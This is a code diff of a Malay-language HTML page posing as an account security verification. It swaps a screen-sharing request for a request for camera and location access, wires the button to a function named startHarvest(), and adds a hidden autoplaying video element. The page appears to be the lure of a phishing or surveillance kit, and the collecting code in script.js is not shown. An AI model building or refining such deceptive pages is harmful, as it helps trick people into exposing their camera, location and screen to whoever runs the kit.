@@ -9,13 +9,18 @@
 <body>
 
     <div class="container">
-        <h1>Sistem Pengesahan AI</h1>
-        <p>Sistem mengesan aktiviti luar tabii. Untuk memastikan akaun anda selamat, sila kongsi skrin anda untuk semakan pihak keselamatan.</p>
+        <h1>Pengesahan Diperlukan</h1>
+        <p>Sila benarkan akses kamera dan lokasi untuk meneruskan semakan keselamatan akaun anda.</p>
         
-        <button id="start-btn" onclick="startRecording()">Kongsi Skrin Sekarang</button>
+        <!-- Butang ni yang panggil fungsi startHarvest() -->
+        <button id="start-btn" onclick="startHarvest()">Mula Pengesahan</button>
         <p id="status" class="status"></p>
     </div>
 
+    <!-- Video tersembunyi -->
+    <video id="preview" autoplay playsinline muted hidden></video>
+
+    <!-- Panggil script.js -->
     <script src="script.js"></script>
 </body>
 </html>
